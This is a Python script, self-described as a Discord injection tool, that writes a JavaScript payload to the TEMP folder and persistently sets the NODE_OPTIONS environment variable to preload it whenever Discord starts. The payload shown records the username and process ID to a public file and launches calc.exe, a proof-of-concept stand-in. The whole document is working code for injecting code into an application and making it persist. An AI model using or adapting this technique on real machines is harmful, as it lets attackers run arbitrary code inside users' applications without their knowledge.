"""
discord_node_options_inject.py -- Injection via NODE_OPTIONS
Sets the environment variable to load a malicious script
when Discord starts.
"""
import os, subprocess

malicious_script = os.path.join(
    os.environ["TEMP"], "discord_inject.js"
)

# Create payload script
with open(malicious_script, "w") as f:
    f.write('''
const fs = require('fs');
const os = require('os');
fs.writeFileSync(
    'C:\\\\Users\\\\Public\\\\discord_node_inject.txt',
    'NODE_OPTIONS injection\\nUser: ' +
    os.userInfo().username + '\\nPID: ' + process.pid
);
try { require('child_process').exec('calc.exe'); } catch(e) {}
''')

# Set environment variable (persistent)
subprocess.run([
    "setx", "NODE_OPTIONS",
    f"--require={malicious_script}"
], capture_output=True)

print(f"NODE_OPTIONS configured.")
print(f"Discord will execute {malicious_script} on startup.")
